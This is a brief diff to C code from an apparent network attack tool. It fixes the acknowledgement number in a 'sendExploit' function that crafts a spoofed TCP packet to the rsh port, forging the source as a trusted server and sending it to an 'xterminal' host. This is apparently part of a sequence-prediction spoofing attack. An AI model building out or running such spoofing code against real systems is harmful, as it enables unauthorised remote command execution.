@@ -121,7 +121,7 @@ void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_lon
         sleep(1);
 
 //ACK
-        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1235,htonl(next+1),(char*)payload,plen, (u_int8_t)(TH_ACK | TH_PUSH));
+        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1235,next+1,(char*)payload,plen, (u_int8_t)(TH_ACK | TH_PUSH));
         ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)plen);
         sendPacket(l);
 }
